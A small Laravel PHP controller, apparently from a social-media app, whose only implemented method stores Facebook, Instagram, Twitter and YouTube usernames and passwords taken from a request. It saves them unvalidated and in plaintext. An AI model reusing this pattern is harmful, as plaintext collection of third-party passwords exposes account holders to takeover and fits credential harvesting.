<?php

namespace App\Http\Controllers;

use App\Models\logindaten;
use Illuminate\Http\Request;

class logindatencontroller extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        //
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $logindaten= new logindaten();
        $logindaten->FB_Benutzername = $request->FB_Name;
        $logindaten->FB_PASSWORT = $request->FB_PASS;
        $logindaten->IG_Benutzername = $request->IG_Name;
        $logindaten->IG_PASSWORT = $request->IG_PASS;
        $logindaten->TW_Benutzername = $request->TW_Name;
        $logindaten->TW_PASSWORT = $request->TW_PASS;
        $logindaten->YT_Benutzername = $request->YT_Name;
        $logindaten->YT_PASSWORT = $request->YT_PASS;

        $logindaten->save();
        return redirect('/main');
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }
}
